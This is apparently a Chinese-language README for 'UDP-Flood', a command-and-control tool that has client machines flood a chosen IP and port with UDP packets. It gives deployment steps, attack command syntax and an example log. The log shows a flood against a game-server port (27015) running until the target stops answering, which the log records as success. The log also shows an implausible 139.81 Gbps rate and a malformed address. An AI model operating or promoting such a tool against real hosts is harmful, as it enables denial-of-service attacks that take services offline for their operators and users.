# UDP-Flood

轻量级C2框架，支持对指定目标进行 UDP 流量发包和连通性检测。

```
CommandServer/
├─ config_main.json
├─ main_client.py
└─ ping.py

Client/
├─ config_sub.json
├─ sub_client.py
└─ udp.py
```

### 使用方法
 - 上传 "CommandServer/" 到母机
 - 上传 "Client/" 到所有子机
 - 配置 config_main.json 和 config_sub.json
 - 子机运行 sub_client.py
 - 母机运行 main_client.py

### 命令

#### main_client.py
-ls
```
输出所有子端的信息和状态
```
udp <ip:port> <packet_size> <rate_mbps>
```
启动一次发包任务
```

### 示例
```
-> udp 127.0.0.1:27015 2500 1000
[23:44:37] 执行UDP攻击: 目标=127.0.0.1:27015, 数据包大小=2500, 速率=1000 Mbps 
[23:44:37] Starting UDP attack on 127.0.0.1:27015
[23:44:37] Ping attempt 1 to 127.0.0.1:27015
输入命令: [23:44:37] Ping to 127.0.0.1:27015: success (returncode: 0)
[23:44:37] Target 127.0.0.1:27015 is reachable
[23:44:37] Connecting to 127.0.0.2:5000
[23:44:37] Sending command to 127.0.0.2:5000: udp 127.0.0.1:27015 2500 1000
[23:44:38] Timeout waiting for response from 127.0.0.2:5000
[23:44:38] Connecting to 127.0.0.3:5000 
[23:44:38] Starting ping to 127.0.0.1:27015
[23:44:38] Sent A2S_INFO request to 127.0.0.1:27015
[23:44:38] Sending command to 127.0.0.3:5000 : udp 127.0.0.1:27015 2500 1000 
[23:44:38] Received data from 127.0.0.1:27015, size: 9 bytes
[23:44:38] 来自 127.0.0.1:27015 的回复, Ping: 67.764 ms, 大小: 9 字节
[23:44:38] Socket closed for 127.0.0.1:27015
[23:44:38] Ping result: success (returncode: 0)
[23:44:39] Timeout waiting for response from 127.0.0.3:5000
[23:44:39] Starting ping to 127.0.0.1:27015
[23:44:39] Sent A2S_INFO request to 127.0.0.1:27015
[23:44:39] Received data from 127.0.0.1:27015, size: 9 bytes
[23:44:39] 来自 127.0.0.1:27015 的回复, Ping: 73.263 ms, 大小: 9 字节
[23:44:39] Socket closed for 127.0.0.1:27015
[23:44:39] Ping result: success (returncode: 0)
[23:44:39] Ping to 127.0.0.1:27015: success (returncode: 0)
[23:44:39] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015 
[23:45:17] Ping to 127.0.0.1:27015 timed out
[23:45:17] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:19] Ping to 127.0.0.1:27015 timed out
[23:45:19] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:21] Ping to 127.0.0.1:27015 timed out
[23:45:21] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:23] Ping to 127.0.0.1:27015 timed out
[23:45:23] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:25] Ping to 127.0.0.1:27015 timed out
[23:45:25] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:27] Ping to 127.0.0.1:27015 timed out
[23:45:27] Sending 139810.13 Mbps [139.81 Gbps] to 1127.0.0.1:27015
[23:45:29] Ping to 127.0.0.1:27015 timed out
[23:45:29] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:31] Ping to 127.0.0.1:27015 timed out
[23:45:31] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:33] Ping to 127.0.0.1:27015 timed out
[23:45:33] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:35] Ping to 127.0.0.1:27015 timed out
[23:45:35] Sending 139810.13 Mbps [139.81 Gbps] to 127.0.0.1:27015
[23:45:35] Attack on 127.0.0.1:27015 stopped: 10 consecutive ping timeouts. [Success]
[23:45:35] Local attack processes terminated [23:49:59] Sub sockets: []
[23:50:00] Sending stop command to 127.0.0.2:5000 (attempt 1)
[23:50:00] Stop response from 127.0.0.2:5000: stopped
[23:50:00] Sending stop command to 127.0.0.3:5000 (attempt 1)
[23:50:00] Stop response from 127.0.0.3:5000: stopped
```
